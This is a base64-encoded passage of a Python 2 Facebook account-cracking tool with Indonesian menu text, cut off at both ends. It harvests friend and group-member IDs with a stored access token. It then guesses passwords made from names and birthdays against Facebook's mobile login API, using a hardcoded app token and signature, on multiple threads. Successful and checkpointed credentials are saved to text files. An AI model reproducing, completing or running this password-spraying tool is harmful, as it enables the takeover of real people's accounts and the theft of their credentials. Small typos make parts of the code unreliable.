TNceDFiWzE7OTFtXSBceDFiWzE7OTJtTmFtZVx4MWJbMTs5N20gICAgIDogJyArIGFbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtVXNlcm5hbWVceDFiWzE7OTdtIDogJyArIGlkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5ZVx4YjldIFx4MWJbMTs5Mm1QYXNzd29yZFx4MWJbMTs5N20gOiAnICsgcHo1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVudV9oYWNrKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFNvcnJ5LCBvcGVuaW5nIHBhc3N3b3JkIHRhcmdldCBmYWlsZWQgOignCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUcnkgb3RoZXIgbWV0aG9kLicKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtQmFjayBceDFiWzE7OTFtXScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtZW51X2hhY2soKQogICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gVGVyZ2V0IG5vdCBmb3VuZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgbWVudV9oYWNrKCkKCgpkZWYgY3JhY2soKToKICAgIGdsb2JhbCBmaWxlCiAgICBnbG9iYWwgaWRsaXN0CiAgICBnbG9iYWwgcGFzc3cKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKICAgICAgICBsb2dpbigpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgIGlkbGlzdCA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtRmlsZSBJRCAgXHgxYlsxOzkxbTogXHgxYlsxOzk3bScpCiAgICAgICAgcGFzc3cgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybVBhc3N3b3JkIFx4MWJbMTs5MW06IFx4MWJbMTs5N20nKQogICAgICAgIHRyeToKICAgICAgICAgICAgZmlsZSA9IG9wZW4oaWRsaXN0LCAncicpCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybVBsZWFzZSB3YWl0IFx4MWJbMTs5N20uLi4nKQogICAgICAgICAgICBmb3IgeCBpbiByYW5nZSg0MCk6CiAgICAgICAgICAgICAgICB6ZWRkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2NyYWssIGFyZ3M9KCkpCiAgICAgICAgICAgICAgICB6ZWRkLnN0YXJ0KCkKICAgICAgICAgICAgICAgIHRocmVhZHMuYXBwZW5kKHplZGQpCgogICAgICAgICAgICBmb3IgemVkZCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgemVkZC5qb2luKCkKCiAgICAgICAgZXhjZXB0IElPRXJyb3I6CiAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kJwogICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICBtZW51X2hhY2soKQoKCmRlZiBzY3JhaygpOgogICAgZ2xvYmFsIGJhY2sKICAgIGdsb2JhbCBiZXJoYXNpbAogICAgZ2xvYmFsIGNla3BvaW50CiAgICBnbG9iYWwgZ2FnYWwKICAgIGdsb2JhbCB1cAogICAgdHJ5OgogICAgICAgIGJ1a2EgPSBvcGVuKGlkbGlzdCwgJ3InKQogICAgICAgIHVwID0gYnVrYS5yZWFkKCkuc3BsaXQoKQogICAgICAgIHdoaWxlIGZpbGU6CiAgICAgICAgICAgIHVzZXJuYW1lID0gZmlsZS5yZWFkbGluZSgpLnN0cmlwKCkKICAgICAgICAgICAgdXJsID0gJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0nICsgdXNlcm5hbWUgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzc3cgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JwogICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4odXJsKQogICAgICAgICAgICBtcHNoID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgIGlmIGJhY2sgPT0gbGVuKHVwKToKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIG1wc2g6CiAgICAgICAgICAgICAgICBiaXNhID0gb3BlbignQmVyaGFzaWwudHh0JywgJ3cnKQogICAgICAgICAgICAgICAgYmlzYS53cml0ZSh1c2VybmFtZSArICcgfCAnICsgcGFzc3cgKyAnXG4nKQogICAgICAgICAgICAgICAgYmlzYS5jbG9zZSgpCiAgICAgICAgICAgICAgICBiZXJoYXNpbC5hcHBlbmQoJ1x4MWJbMTs5N21bXHgxYlsxOzkybVx4ZTJceDljXHg5M1x4MWJbMTs5N21dICcgKyB1c2VybmFtZSArICcgfCAnICsgcGFzc3cpCiAgICAgICAgICAgICAgICBiYWNrICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBtcHNoWydlcnJvcl9tc2cnXToKICAgICAgICAgICAgICAgICAgICBjZWsgPSBvcGVuKCdDZWtwb2ludC50eHQnLCAndycpCiAgICAgICAgICAgICAgICAgICAgY2VrLndyaXRlKHVzZXJuYW1lICsgJyB8ICcgKyBwYXNzdyArICdcbicpCiAgICAgICAgICAgICAgICAgICAgY2VrLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICBjZWtwb2ludC5hcHBlbmQoJ1x4MWJbMTs5N21bXHgxYlsxOzkzbVx4ZTJceDljXHg5YVx4MWJbMTs5N21dICcgKyB1c2VybmFtZSArICcgfCAnICsgcGFzc3cpCiAgICAgICAgICAgICAgICAgICAgYmFjayArPSAxCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGdhZ2FsLmFwcGVuZCh1c2VybmFtZSkKICAgICAgICAgICAgICAgICAgICBiYWNrICs9IDEKICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgnXHJceDFiWzE7OTFtW1x4MWJbMTs5Nm1ceGUyXHg5Y1x4YjhceDFiWzE7OTFtXSBceDFiWzE7OTJtQ3JhY2sgICAgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBzdHIoYmFjaykgKyAnIFx4MWJbMTs5Nm0+XHgxYlsxOzk3bSAnICsgc3RyKGxlbih1cCkpICsgJyA9Plx4MWJbMTs5Mm1MaXZlXHgxYlsxOzkxbTpceDFiWzE7OTZtJyArIHN0cihsZW4oYmVyaGFzaWwpKSArICcgXHgxYlsxOzk3bT0+XHgxYlsxOzkzbUNoZWNrXHgxYlsxOzkxbTpceDFiWzE7OTZtJyArIHN0cihsZW4oY2VrcG9pbnQpKSkKICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCgogICAgZXhjZXB0IElPRXJyb3I6CiAgICAgICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVshXSBDb25uZWN0aW9uIGJ1c3knCiAgICAgICAgdGltZS5zbGVlcCgwLjAxKQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDljXHg5Nl0gTm8gY29ubmVjdGlvbicKCgpkZWYgaGFzaWwoKToKICAgIHByaW50CiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgZm9yIGIgaW4gYmVyaGFzaWw6CiAgICAgICAgcHJpbnQgYgoKICAgIGZvciBjIGluIGNla3BvaW50OgogICAgICAgIHByaW50IGMKCiAgICBwcmludAogICAgcHJpbnQgJ1x4MWJbMzFtW3hdIEZhaWxlZCBceDFiWzE7OTdtLS0+ICcgKyBzdHIobGVuKGdhZ2FsKSkKICAgIGtlbHVhcigpCgoKZGVmIHN1cGVyKCk6CiAgICBnbG9iYWwgdG9rZXQKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBsb2dpbigpCgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG0xLiBDcmFjayBmcm9tIEZyaWVuZHMnCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzM3OzQwbTIuIENyYWNrIGZyb20gR3JvdXAnCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzM3OzQwbTMuIENyYWNrIGZyb20gRmlsZScKICAgIHByaW50ICfilZEtPiBceDFiWzE7MzE7NDBtMC4gS2VtYmFsaScKICAgIHByaW50ICdceDFiWzE7Mzc7NDBt4pWRJwogICAgcGlsaWhfc3VwZXIoKQoKCmRlZiBwaWxpaF9zdXBlcigpOgogICAgcGVhayA9IHJhd19pbnB1dCgn4pWa4pWQXHgxYlsxOzkxbeKWtlx4MWJbMTs5N20gJykKICAgIGlmIHBlYWsgPT0gJyc6CiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gQ2FuXCd0IGVtcHR5JwogICAgICAgIHBpbGloX3N1cGVyKCkKICAgIGVsc2U6CiAgICAgICAgaWYgcGVhayA9PSAnMSc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICBwcmludCBsb2dvCiAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgIGphbGFuKCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1NZW5nYW1iaWwgaWQgVGVtYW4gXHgxYlsxOzk3bS4uLicpCiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgeiA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgICAgICAgICBmb3IgcyBpbiB6WydkYXRhJ106CiAgICAgICAgICAgICAgICBpZC5hcHBlbmQoc1snaWQnXSkKCiAgICAgICAgZWxzZToKICAgICAgICAgICAgaWYgcGVhayA9PSAnMic6CiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICAgICAgICAgIHByaW50IGxvZ28KICAgICAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgICAgICBpZGcgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUlEIEdyb3VwICAgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcpCiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JvdXAvP2lkPScgKyBpZGcgKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICAgICAgICAgICAgICAgICAgYXN3ID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm1OYW1lIGdydXAgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBhc3dbJ25hbWUnXQogICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCcKICAgICAgICAgICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICAgICAgICAgIHN1cGVyKCkKCiAgICAgICAgICAgICAgICByZSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlkZyArICcvbWVtYmVycz9maWVsZHM9bmFtZSxpZCZsaW1pdD05OTk5OTk5OTkmYWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgICAgIHMgPSBqc29uLmxvYWRzKHJlLnRleHQpCiAgICAgICAgICAgICAgICBmb3IgaSBpbiBzWydkYXRhJ106CiAgICAgICAgICAgICAgICAgICAgaWQuYXBwZW5kKGlbJ2lkJ10pCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiBwZWFrID09ICczJzoKICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICAgICAgICAgICAgICBwcmludCBsb2dvCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlkbGlzdCA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtRmlsZSBJRCAgXHgxYlsxOzkxbTogXHgxYlsxOzk3bScpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIG9wZW4oaWRsaXN0LCdyJykucmVhZGxpbmVzKCk6CiAgICAgICAgICAgICAgICAgICAgICAgIAlpZC5hcHBlbmQobGluZS5zdHJpcCgpKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBGaWxlIG5vdCBmb3VuZCcKICAgICAgICAgICAgICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgICAgICAgICAgICAgc3VwZXIoKQoKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgaWYgcGVhayA9PSAnMCc6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWNceDk2XSBceDFiWzE7OTdtJyArIHBlYWsgKyAnIFx4MWJbMTs5MW1UaWRhayBhZGEnCiAgICAgICAgICAgICAgICAgICAgICAgIHBpbGloX3N1cGVyKCkKICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1Ub3RhbCBJRCBceDFiWzE7OTFtOiBceDFiWzE7OTdtJyArIHN0cihsZW4oaWQpKQogICAgamFsYW4oJ1x4MWJbMTs5MW1bXHhlMlx4OWNceGJhXSBceDFiWzE7OTJtTW9ob24gVHVuZ2d1IFx4MWJbMTs5N20uLi4nKQogICAgdGl0aWsgPSBbJy4gICAnLCAnLi4gICcsICcuLi4gJ10KICAgIGZvciBvIGluIHRpdGlrOgogICAgICAgIHByaW50ICdcclxyXHgxYlsxOzkxbVtceDFiWzE7OTZtXHhlMlx4OWNceGI4XHgxYlsxOzkxbV0gXHgxYlsxOzkybUNyYWNrIFx4MWJbMTs5N20nICsgbywKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0aW1lLnNsZWVwKDAuMDEpCgogICAgcHJpbnQKICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCgogICAgZGVmIG1haW4oYXJnKToKICAgICAgICB1c2VyID0gYXJnCiAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIHVzZXIgKyAnLz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICAgICAgYiA9IGpzb24ubG9hZHMoYS50ZXh0KQogICAgICAgICAgICAgICAgcGFzczEgPSBiWydmaXJzdF9uYW1lJ10gKyAnMTIzJwogICAgICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9JyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczEgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JykKICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5N21ceDFiWzE7OTJtW+Kck11ceDFiWzE7OTdtICcgKyB1c2VyICsgJyB8ICcgKyBwYXNzMSArICcgLS0+ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzk3bVx4MWJbMTs5M21bK11ceDFiWzE7OTdtICcgKyB1c2VyICsgJyB8ICcgKyBwYXNzMSArICcgLS0+ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzczIgPSBiWydmaXJzX25hbWUnXSArICcxMjM0NScKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSB1cmxsaWIudXJsb3BlbignaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPScgKyB1c2VyICsgJyZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9JyArIHBhc3MyICsgJyZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTdtXHgxYlsxOzkybVvinJNdXHgxYlsxOzk3bSAnICsgdXNlciArICcgfCAnICsgcGFzczIgKyAnIC0tPiAnICsgYlsnbmFtZSddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvcl9tc2cnXToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5N21ceDFiWzE7OTNtWytdXHgxYlsxOzk3bSAnICsgdXNlciArICcgfCAnICsgcGFzczIgKyAnIC0tPiAnICsgWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzczMgPSBiWydsYXN0X25hbWUnXSArICcxMjMnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0nICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzMyArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzk3bVx4MWJbMTs5Mm1b4pyTXVx4MWJbMTs5N20gJyArIHVzZXIgKyAnIHwgJyArIHBhc3MzICsgJyAtLT4gJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTdtXHgxYlsxOzkzbVsrXVx4MWJbMTs5N20gJyArIHVzZXIgKyAnIHwgJyArIHBhc3MzICsgJyAtLT4gJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CgkJCQkJCSAgICBwYXNzNCA9IGJbJ2xhc3RfbmFtZSddICsgJzEyMzQ1JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IHVybGxpYi51cmxvcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9JyArIHVzZXIgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcGFzczQgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5N21ceDFiWzE7OTJtW+Kck11ceDFiWzE7OTdtICcgKyB1c2VyICsgJyB8ICcgKyBwYXNzNCArICcgLS0+ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgIAkJCQkgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTdtXHgxYlsxOzkzbVsrXVx4MWJbMTs5N20gJyArIHVzZXIgKyAnIHwgJyArIHBhc3M0ICsgJyAtLT4gJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgIAkJCQkJZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJpcnRoZGF5ID0gYlsnYmlydGhkYXknXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzczUgPSBiaXJ0aGRheS5yZXBsYWNlKCcvJywgJycpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0nICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzNSArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzk3bVx4MWJbMTs5Mm1b4pyTXVx4MWJbMTs5N20gJyArIHVzZXIgKyAnIHwgJyArIHBhc3M1ICsgJyAtLT4gJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3J